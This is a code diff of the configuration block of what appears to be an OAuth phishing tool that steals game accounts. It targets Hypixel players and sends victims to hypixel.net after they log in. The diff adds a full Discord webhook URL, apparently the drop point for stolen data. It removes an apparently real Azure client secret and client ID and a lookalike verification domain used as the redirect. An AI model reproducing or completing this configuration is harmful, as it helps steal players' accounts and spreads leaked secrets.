@@ -1,9 +1,9 @@
-const dh = ""
+const dh = "https://discord.com/api/webhooks/1106776324925837322/9ljrZVGZQNDZFB73dwHjDITvbL67WyknmcBsCySvr9bVzHtTTJRMqFRvdUei0_h0N9ls"
 
 //Change these
-const client_secret = '9tG8Q~xjK6JO8Fm~-Wwex3_bWZ6fH.0HDgV4qcDu' //you need to put the "Secret Value" here not the "Secret ID"!!!!
-const client_id = '95ba65b9-1f54-492c-8cac-dd41a29c57ee'
-const redirect_uri = 'https://discordtagverification.xyz'
+const client_secret = '' //you need to put the "Secret Value" here not the "Secret ID"!!!!
+const client_id = ''
+const redirect_uri = ''
 const redirection = 'https://hypixel.net/' //Redirects the user after they login and allow (e.g 'https://hypixel.net') LEAVE BLANK IF U DONT WANT IT TO REDIRECT OR SUM IDK
 
 //Requirements
